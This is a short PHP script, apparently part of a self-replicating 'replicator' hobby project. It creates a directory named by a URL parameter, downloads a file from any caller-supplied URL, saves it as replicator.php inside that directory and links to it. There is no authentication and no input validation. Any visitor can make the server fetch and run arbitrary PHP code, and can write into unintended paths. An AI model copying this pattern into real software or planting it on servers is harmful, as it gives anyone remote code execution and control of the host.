<?php
//mkdir.php?dir=[dirname]

$dirname = $_GET["dir"];//get dir
mkdir($dirname);

if(isset($_GET["replicator"])){

    $replicatorurl = $_GET["replicator"];
    copy($replicatorurl,$dirname."/replicator.php");
    
}
else{
    copy("php/replicator.txt",$dirname."/replicator.php");    
}



//echo "<a href = \"".$dirname."/replicator.php\">".$dirname."/replicator.php</a>";

echo "<a href = \"".$dirname."/replicator.php\">CLICK ME(2/3)</a>";

?>
<style>
body{
    background-color:BLACK;
    font-family:Comic Sans MS;
    font-size:3em;
}
    a{
        font-size:3em;
        color:#ff2cb4;
;
    }
</style>